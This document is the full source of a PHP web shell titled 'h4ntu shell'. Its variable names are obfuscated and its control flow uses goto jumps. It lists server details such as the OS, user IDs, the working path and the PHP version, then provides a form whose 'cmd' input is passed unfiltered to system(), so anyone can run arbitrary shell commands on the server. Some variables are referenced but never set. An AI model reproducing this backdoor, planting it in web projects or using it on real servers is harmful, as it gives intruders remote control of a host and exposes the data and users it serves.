<?php
>h4ntu shell [powered by tsoi]</title>
<?php 
echo "<p><font size=2 face=Verdana><b>This Is The Server Information</b></font></p>";
?>

<?php 
closelog();
$hWvq4 = get_current_user();
$a1hxB = posix_getuid();
$yECcq = posix_geteuid();
$m80Tz = phpversion();
$Nza1x = posix_getgid();
if (!($icCU3 == "")) {
    goto NEU5N;
}
$icCU3 = getcwd();
NEU5N:
if ($krOwN) {
    goto wCKXd;
}
$krOwN = exec("whoami");
wCKXd:
?>
<meta name="generator" content="Namo WebEditor v5.0">
<br>
<TABLE BORDER="0" CELLPADDING="0" CELLSPACING="0">
<?php 
$TKhUk = posix_uname();
MUL6o:
if (!(list($zO9Vv, $ePlT6) = each($TKhUk))) {
    goto ASymg;
}
?>
  <TR>
    <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><?php 
echo $zO9Vv;
?>: <?php 
echo $ePlT6;
?></DIV></TD>
  </TR>
<?php 
goto MUL6o;
ASymg:
?>
  <TR>

  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>User Info:</b> uid=<?php 
echo $a1hxB;
?>(<?php 
echo $krOwN;
?>) euid=<?php 
echo $yECcq;
?>(<?php 
echo $krOwN;
?>) gid=<?php 
echo $Nza1x;
?>(<?php 
echo $krOwN;
?>)</DIV></TD>
  </TR>
  <TR>
  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>Current Path:</b> <?php 
echo $icCU3;
?></DIV></TD>

  </TR>
  <TR>
  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>Permission Directory:</b> <? if(@is_writable($chdir)){ echo "Yes"; }else{ echo "No"; } ?></DIV></TD>
  </TR>  
  <TR>
  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>Server Services:</b> <?php 
echo "{$MOQqs} {$g_zX1}";
?></DIV></TD>
  </TR>

  <TR>
  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>Server Adress:</b> <?php 
echo "{$sVtiN} {$sZYUZ}";
?></DIV></TD>
  </TR>
  <TR>
  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>Script Current User:</b> <?php 
echo $hWvq4;
?></DIV></TD>
  </TR>
  <TR>

  <TD><DIV STYLE="font-family: verdana; font-size: 10px;"><b>PHP Version:</b> <?php 
echo $m80Tz;
?></DIV></TD>
  </TR>
</TABLE>
<BR>

<font face="courier new" size="2" color="777777"><b>#</b>php injection: <br>
</font><FORM name=injection METHOD=POST ACTION="<?php 
echo $_SERVER["REQUEST_URI"];
?>">
<font face="courier new" size="2" color="777777">cmd : 
<INPUT TYPE="text" NAME="cmd" value="<?php 
echo stripslashes(htmlentities($_POST['cmd']));
?>" size="161">
<br>
<INPUT TYPE="submit">
</font></FORM>

<hr color=777777 width=100% height=115px>

<pre>
<?
$cmd = $_POST['cmd'];
  if (isset($chdir)) @chdir($chdir);
  ob_start();
  system("$cmd 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm /tmp/cmdtemp");
  $output = ob_get_contents();
  ob_end_clean();
  if (!empty($output)) echo str_replace(">", "&gt;", str_replace("<", "&lt;", $output));
exit;
?>
</pre>
